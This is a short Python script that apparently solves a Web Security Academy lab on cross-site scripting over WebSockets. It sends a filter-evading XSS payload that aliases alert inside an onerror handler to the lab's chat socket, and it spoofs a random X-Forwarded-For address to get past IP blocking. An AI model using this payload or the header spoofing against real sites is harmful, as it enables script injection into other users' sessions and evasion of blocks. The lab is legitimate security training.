from web_security_academy.core.logger import logger
from websockets.client import connect
from urllib.parse import urlparse
from random import randint

import asyncio
import json
import time


def solve_lab(session):
    hostname = urlparse(session.url).hostname
    payload = "<img src=1 onerror ='xxs = alert; xxs(1)'>"

    ip = ".".join([str(randint(0, 255)) for _ in range(4)])
    coro = send_payload(hostname, payload, ip)
    asyncio.run(coro)
    time.sleep(1)


async def send_payload(hostname, payload, ip):
    async with connect(
        f"wss://{hostname}/chat", extra_headers={"X-Forwarded-For": ip}
    ) as websocket:
        message = json.dumps({"message": payload})
        await websocket.send(message)
        logger.info(f"Sent the following payload: {message}")
